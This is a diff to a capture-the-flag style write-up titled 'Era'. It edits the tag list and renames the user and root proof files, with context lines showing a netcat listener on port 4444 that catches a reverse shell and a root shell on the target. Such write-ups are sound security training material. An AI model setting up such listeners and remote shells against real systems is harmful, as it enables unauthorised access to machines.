@@ -1,7 +1,7 @@
 ---
 title: Era
 slug: Era
-tags: [Linux, FTP, Fuzzing, SSRF, IDOR, PHP-Wrapper-Abuse, Signature-Section-Injection, Objcopy, Vulnerability Research]
+tags: [SSRF, IDOR, PHP-Wrapper-Abuse, Signature-Section-Injection, Objcopy, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -608,8 +608,8 @@ PS C:\Users\At0m\Temp\nc.exe> ./nc.exe -nlvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.207] from (UNKNOWN) [10.10.11.79] 40606
 ls
-user.txt
-cat user.txt
+local-proof.txt
+cat local-proof.txt
 <REDACTED>
 ```
 ## Privilege Escalation Path
@@ -812,9 +812,9 @@ answers.sh
 clean_monitor.sh
 initiate_monitoring.sh
 monitor
-root.txt
-root@era:~# cat root.txt
-cat root.txt
+privileged-proof.txt
+root@era:~# cat privileged-proof.txt
+cat privileged-proof.txt
 <REDACTED>
 ```
 
